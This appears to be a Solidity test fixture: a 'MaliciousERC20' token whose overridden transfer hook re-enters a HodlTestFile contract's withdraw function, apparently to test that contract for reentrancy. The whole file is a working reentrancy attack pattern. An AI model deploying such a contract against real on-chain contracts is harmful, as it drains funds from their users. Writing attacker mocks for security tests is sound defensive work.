// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {HodlTestFile} from "../src/HodlTestFile.sol"; // Adjust import as needed;

contract MaliciousERC20 is ERC20 {
    HodlTestFile public hodl;
    address public targetToken;
    bool private attackInProgress;

    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function setTarget(HodlTestFile _hodl, address _token) external {
        hodl = _hodl;
        targetToken = _token;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        if (!attackInProgress && from == address(hodl) && amount > 0) {
            attackInProgress = true;
            hodl.withdraw(targetToken);
        }
        super._transfer(from, to, amount);
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}
